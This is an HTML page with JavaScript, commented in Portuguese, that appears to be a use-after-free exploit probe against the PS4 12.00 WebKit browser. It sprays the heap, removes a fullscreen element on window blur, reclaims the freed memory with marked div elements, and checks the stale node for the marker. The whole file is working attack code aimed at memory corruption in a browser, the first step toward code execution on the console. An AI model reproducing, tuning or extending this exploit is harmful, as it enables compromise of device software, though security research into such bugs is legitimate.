<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Precise Reclaim</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Precise Reclaim (Aligned)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO
// ==========================
let logBuffer = [];

function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 PRECISE MONOTYPE RECLAIM
// ==========================
function preciseReclaim() {
    log("[*] Precise reclaim iniciado");

    let bucket = [];

    // 🔹 Fase 1 — churn controlado
    for (let i = 0; i < 3000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // 🔹 Fase 2 — REUSE DIRECIONADO (estrutura idêntica)
    for (let i = 0; i < 8000; i++) {
        let el = document.createElement("div");

        el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "<br>Press OPTIONS</h1>";

        el.style.background = "black";
        el.style.width = "1%";
        el.style.height = "1%";
        el.style.position = "absolute";
        el.style.top = "0";
        el.style.left = "0";

        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔹 Fase 3 — churn final leve
    for (let i = 0; i < 2000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    log("[*] Precise reclaim finalizado: " + bucket.length);
    return bucket;
}

// ==========================
// 🔬 DETECÇÃO
// ==========================
function checkUAF(fsTarget) {
    log("---- CHECK UAF ----");

    try {
        let html = fsTarget.innerHTML;
        log("[CHECK] innerHTML = " + html);

        if (html && html.includes("CONTROL_")) {
            log("[!!!] UAF CONTROLADO (MATCH PERFEITO)");
        }

    } catch(e) {
        log("[UAF] innerHTML erro");
    }

    try {
        let node = fsTarget.firstChild;
        log("[CHECK] firstChild = " + node);
    } catch(e) {
        log("[UAF] firstChild erro");
    }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e) {
        log("[ERRO]");
    }

    // 🔥 janelas críticas (mantidas + ajuste fino)
    setTimeout(() => preciseReclaim(), 0);
    setTimeout(() => preciseReclaim(), 50);
    setTimeout(() => preciseReclaim(), 100);
    setTimeout(() => preciseReclaim(), 150); // 🔥 NOVO

    // 🔬 checks
    setTimeout(() => checkUAF(fsTarget), 10);
    setTimeout(() => checkUAF(fsTarget), 30);
    setTimeout(() => checkUAF(fsTarget), 60);
    setTimeout(() => checkUAF(fsTarget), 120);
    setTimeout(() => checkUAF(fsTarget), 250);

    // 🔒 dump seguro
    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

    // 🔁 comportamento original
    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO)
// ==========================
function runTest() {
    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");

        // ⚠️ timing crítico intacto
        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
